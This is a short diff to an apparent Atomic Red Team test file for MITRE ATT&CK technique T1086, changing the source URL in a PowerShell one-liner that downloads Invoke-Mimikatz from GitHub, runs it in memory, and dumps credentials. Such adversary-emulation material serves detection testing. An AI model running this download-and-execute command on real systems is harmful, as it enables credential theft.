@@ -4,7 +4,7 @@ MITRE ATT&CK Technique: [T1086](https://attack.mitre.org/wiki/Technique/T1086)
 
 ### Download Mimikatz and Dump credentials
 
-    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
 ### Download and Execute BloodHound
 
